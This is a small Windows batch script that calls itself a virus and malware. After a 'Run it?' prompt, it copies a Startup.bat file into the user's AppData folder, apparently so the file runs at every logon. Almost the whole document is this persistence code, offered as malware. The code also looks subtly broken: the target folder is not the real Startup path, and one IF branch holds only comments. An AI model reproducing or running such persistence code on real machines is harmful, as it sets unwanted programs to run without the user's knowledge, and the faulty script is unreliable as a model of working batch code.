:: Hey buddy. Dont go poking around with my virus.

@echo off
goto warning

:warning
echo.
echo This is malware. Run it?
echo.
pause
cls
goto copy

:copy

IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start\Startup.bat" (
    :: ts is for if the startup file DOES exist.
) ELSE (
    :: ts is if it DOES NOT exist.
    copy %cd%\prgfiles\Startup.bat C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start
)
exit